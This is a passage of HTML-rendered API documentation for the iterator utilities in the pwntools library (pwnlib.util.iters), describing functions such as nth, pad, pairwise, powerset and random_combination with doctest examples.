<span class="gp">&gt;&gt;&gt; </span><span class="p">[</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">group</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s1">&#39;ABCDEFG&#39;</span><span class="p">,</span> <span class="s1">&#39;x&#39;</span><span class="p">)]</span>
<span class="go">[&#39;ABC&#39;, &#39;DEF&#39;, &#39;Gxx&#39;]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.iter_except">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">iter_except</code><span class="sig-paren">(</span><em>func</em>, <em>exception</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L529-563"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.iter_except" title="Permalink to this definition">¶</a></dt>
<dd><p>Calls <cite>func</cite> repeatedly until an exception is raised.  Works like the
build-in <a class="reference external" href="https://docs.python.org/2.7/library/functions.html#iter" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">iter()</span></code></a> but uses an exception instead of a sentinel to signal
the end.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>func</strong> &#8211; The function to call.</li>
<li><strong>exception</strong> (<a class="reference internal" href="index.html#pwnlib.log.Logger.exception" title="pwnlib.log.Logger.exception"><em>exception</em></a>) &#8211; The exception that signals the end.  Other
exceptions will not be caught.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">An iterator whoose elements are the results of calling <code class="docutils literal"><span class="pre">func()</span></code> until an
exception matching <cite>exception</cite> is raised.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span> <span class="p">{</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">i</span> <span class="o">=</span> <span class="n">iter_except</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">pop</span><span class="p">,</span> <span class="ne">KeyError</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">i</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
<span class="go">1</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">i</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
<span class="go">2</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">i</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
<span class="go">3</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">i</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
<span class="gt">Traceback (most recent call last):</span>
    <span class="o">...</span>
<span class="gr">StopIteration</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.lexicographic">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">lexicographic</code><span class="sig-paren">(</span><em>alphabet</em><span class="sig-paren">)</span> &#x2192; iterator<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L688-707"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.lexicographic" title="Permalink to this definition">¶</a></dt>
<dd><p>The words with symbols in <cite>alphabet</cite>, in lexicographic order (determined by
the order of <cite>alphabet</cite>).</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>alphabet</strong> &#8211; The alphabet to draw symbols from.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">An iterator of the words with symbols in <cite>alphabet</cite>, in lexicographic
order.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">take</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">imap</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="n">lexicographic</span><span class="p">(</span><span class="s1">&#39;01&#39;</span><span class="p">)))</span>
<span class="go">[&#39;&#39;, &#39;0&#39;, &#39;1&#39;, &#39;00&#39;, &#39;01&#39;, &#39;10&#39;, &#39;11&#39;, &#39;000&#39;]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.lookahead">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">lookahead</code><span class="sig-paren">(</span><em>n</em>, <em>iterable</em><span class="sig-paren">)</span> &#x2192; object<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L657-686"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.lookahead" title="Permalink to this definition">¶</a></dt>
<dd><p>Inspects the upcoming element at index <cite>n</cite> without advancing the iterator.
Raises <code class="docutils literal"><span class="pre">IndexError</span></code> if <cite>iterable</cite> has too few elements.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>n</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Index of the element to return.</li>
<li><strong>iterable</strong> &#8211; An iterable.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The element in <cite>iterable</cite> at index <cite>n</cite>.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">i</span> <span class="o">=</span> <span class="n">count</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">lookahead</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
<span class="go">4</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">i</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
<span class="go">0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">i</span> <span class="o">=</span> <span class="n">count</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">nth</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
<span class="go">4</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">i</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
<span class="go">5</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">lookahead</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
<span class="go">10</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.nth">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">nth</code><span class="sig-paren">(</span><em>n</em>, <em>iterable</em>, <em>default = None</em><span class="sig-paren">)</span> &#x2192; object<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L148-174"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.nth" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns the element at index <cite>n</cite> in <cite>iterable</cite>.  If <cite>iterable</cite> is a
iterator it will be advanced.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>n</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Index of the element to return.</li>
<li><strong>iterable</strong> &#8211; An iterable.</li>
<li><strong>default</strong> (<em>objext</em>) &#8211; A default value.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The element at index <cite>n</cite> in <cite>iterable</cite> or <cite>default</cite> if <cite>iterable</cite> has too
few elements.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">nth</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">])</span>
<span class="go">2</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">nth</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span> <span class="mi">42</span><span class="p">)</span>
<span class="go">42</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">i</span> <span class="o">=</span> <span class="n">count</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">nth</span><span class="p">(</span><span class="mi">42</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
<span class="go">42</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">nth</span><span class="p">(</span><span class="mi">42</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
<span class="go">85</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.pad">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">pad</code><span class="sig-paren">(</span><em>iterable</em>, <em>value = None</em><span class="sig-paren">)</span> &#x2192; iterator<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L198-223"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.pad" title="Permalink to this definition">¶</a></dt>
<dd><p>Pad an <cite>iterable</cite> with <cite>value</cite>, i.e. returns an iterator whoose elements are
first the elements of <cite>iterable</cite> then <cite>value</cite> indefinitely.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>iterable</strong> &#8211; An iterable.</li>
<li><strong>value</strong> &#8211; The value to pad with.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">An iterator whoose elements are first the elements of <cite>iterable</cite> then
<cite>value</cite> indefinitely.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">take</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">pad</span><span class="p">([</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">]))</span>
<span class="go">[1, 2, None]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">i</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="nb">iter</span><span class="p">([</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">]),</span> <span class="mi">42</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">take</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
<span class="go">[1, 2]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">take</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
<span class="go">[3, 42]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">take</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
<span class="go">[42, 42]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.pairwise">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">pairwise</code><span class="sig-paren">(</span><em>iterable</em><span class="sig-paren">)</span> &#x2192; iterator<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L331-350"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.pairwise" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>iterable</strong> &#8211; An iterable.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">An iterator whoose elements are pairs of neighbouring elements of
<cite>iterable</cite>.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">list</span><span class="p">(</span><span class="n">pairwise</span><span class="p">([</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">]))</span>
<span class="go">[(1, 2), (2, 3), (3, 4)]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">i</span> <span class="o">=</span> <span class="n">starmap</span><span class="p">(</span><span class="n">operator</span><span class="o">.</span><span class="n">add</span><span class="p">,</span> <span class="n">pairwise</span><span class="p">(</span><span class="n">count</span><span class="p">()))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">take</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
<span class="go">[1, 3, 5, 7, 9]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.powerset">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">powerset</code><span class="sig-paren">(</span><em>iterable</em>, <em>include_empty = True</em><span class="sig-paren">)</span> &#x2192; iterator<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L407-429"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.powerset" title="Permalink to this definition">¶</a></dt>
<dd><p>The powerset of an iterable.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>iterable</strong> &#8211; An iterable.</li>
<li><strong>include_empty</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Whether to include the empty set.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The powerset of <cite>iterable</cite> as an interator of tuples.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">list</span><span class="p">(</span><span class="n">powerset</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">)))</span>
<span class="go">[(), (0,), (1,), (2,), (0, 1), (0, 2), (1, 2), (0, 1, 2)]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">list</span><span class="p">(</span><span class="n">powerset</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="n">include_empty</span> <span class="o">=</span> <span class="kc">False</span><span class="p">))</span>
<span class="go">[(0,), (1,), (0, 1)]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.quantify">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">quantify</code><span class="sig-paren">(</span><em>iterable</em>, <em>pred = bool</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L176-196"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.quantify" title="Permalink to this definition">¶</a></dt>
<dd><p>Count how many times the predicate <cite>pred</cite> is <code class="xref py py-const docutils literal"><span class="pre">True</span></code>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>iterable</strong> &#8211; An iterable.</li>
<li><strong>pred</strong> &#8211; A function that given an element from <cite>iterable</cite> returns either
<code class="xref py py-const docutils literal"><span class="pre">True</span></code> or <code class="xref py py-const docutils literal"><span class="pre">False</span></code>.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The number of elements in <cite>iterable</cite> for which <cite>pred</cite> returns
<code class="xref py py-const docutils literal"><span class="pre">True</span></code>.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">quantify</span><span class="p">([</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">],</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
<span class="go">2</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">quantify</span><span class="p">([</span><span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;two&#39;</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">,</span> <span class="s1">&#39;42&#39;</span><span class="p">],</span> <span class="nb">str</span><span class="o">.</span><span class="n">isdigit</span><span class="p">)</span>
<span class="go">3</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.random_combination">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">random_combination</code><span class="sig-paren">(</span><em>iterable</em>, <em>r</em><span class="sig-paren">)</span> &#x2192; tuple<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L612-631"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.random_combination" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>iterable</strong> &#8211; An iterable.</li>
<li><strong>r</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Size of the combination.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A random element from <code class="docutils literal"><span class="pre">itertools.combinations(iterable,</span> <span class="pre">r</span> <span class="pre">=</span> <span class="pre">r)</span></code>.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">random_combination</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">2</span><span class="p">)</span>
<span class="go">(0, 1)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">random_combination</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span> <span class="n">r</span> <span class="o">=</span> <span class="mi">2</span><span class="p">)</span> <span class="ow">in</span> <span class="n">combinations</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span> <span class="n">r</span> <span class="o">=</span> <span class="mi">2</span><span class="p">)</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.random_combination_with_replacement">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">random_combination_with_replacement</code><span class="sig-paren">(</span><em>iterable</em>, <em>r</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L633-655"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.random_combination_with_replacement" title="Permalink to this definition">¶</a></dt>
<dd><p>random_combination(iterable, r) -&gt; tuple</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>iterable</strong> &#8211; An iterable.</li>
<li><strong>r</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Size of the combination.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A random element from <code class="docutils literal"><span class="pre">itertools.combinations_with_replacement(iterable,</span>
<span class="pre">r</span> <span class="pre">=</span> <span class="pre">r)</span></code>.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">cs</span> <span class="o">=</span> <span class="p">{(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">random_combination_with_replacement</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">2</span><span class="p">)</span> <span class="ow">in</span> <span class="n">cs</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">i</span> <span class="o">=</span> <span class="n">combinations_with_replacement</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span> <span class="n">r</span> <span class="o">=</span> <span class="mi">2</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">random_combination_with_replacement</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span> <span class="n">r</span> <span class="o">=</span> <span class="mi">2</span><span class="p">)</span> <span class="ow">in</span> <span class="n">i</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.random_permutation">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">random_permutation</code><span class="sig-paren">(</span><em>iterable</em>, <em>r=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L591-610"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.random_permutation" title="Permalink to this definition">¶</a></dt>
<dd><p>random_product(iterable, r = None) -&gt; tuple</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>iterable</strong> &#8211; An iterable.</li>
<li><strong>r</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Size of the permutation.  If <code class="xref py py-const docutils literal"><span class="pre">None</span></code> select all elements in
<cite>iterable</cite>.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A random element from <code class="docutils literal"><span class="pre">itertools.permutations(iterable,</span> <span class="pre">r</span> <span class="pre">=</span> <span class="pre">r)</span></code>.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">random_permutation</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span> <span class="ow">in</span> <span class="p">{(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)}</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">random_permutation</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span> <span class="n">r</span> <span class="o">=</span> <span class="mi">2</span><span class="p">)</span> <span class="ow">in</span> <span class="n">permutations</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span> <span class="n">r</span> <span class="o">=</span> <span class="mi">2</span><span class="p">)</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.random_product">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">random_product</code><span class="sig-paren">(</span><em>*args</em>, <em>repeat = 1</em><span class="sig-paren">)</span> &#x2192; tuple<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L565-589"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.random_product" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>args</strong> &#8211; One or more iterables</li>
<li><strong>repeat</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Number of times to repeat <cite>args</cite>.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A random element from <code class="docutils literal"><span class="pre">itertools.product(*args,</span> <span class="pre">repeat</span> <span class="pre">=</span> <span class="pre">repeat)</span></code>.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">args</span> <span class="o">=</span> <span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">random_product</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">)</span> <span class="ow">in</span> <span class="p">{(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)}</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">args</span> <span class="o">=</span> <span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">random_product</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="n">repeat</span> <span class="o">=</span> <span class="mi">2</span><span class="p">)</span> <span class="ow">in</span> <span class="n">product</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="n">repeat</span> <span class="o">=</span> <span class="mi">2</span><span class="p">)</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.repeat_func">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">repeat_func</code><span class="sig-paren">(</span><em>func</em>, <em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span> &#x2192; iterator<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L287-329"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.repeat_func" title="Permalink to this definition">¶</a></dt>
<dd><p>Repeatedly calls <cite>func</cite> with positional arguments <cite>args</cite> and keyword
arguments <cite>kwargs</cite>.  If no keyword arguments is given the resulting iterator
will be computed using only functions from <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#module-itertools" title="(in Python v2.7)"><code class="xref py py-mod docutils literal"><span class="pre">itertools</span></code></a> which are very
fast.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>func</strong> (<a class="reference internal" href="index.html#pwnlib.shellcraft.i386.function" title="pwnlib.shellcraft.i386.function"><em>function</em></a>) &#8211; The function to call.</li>
<li><strong>args</strong> &#8211; Positional arguments.</li>
<li><strong>kwargs</strong> &#8211; Keyword arguments.</li>
</ul>
</td>
</tr>
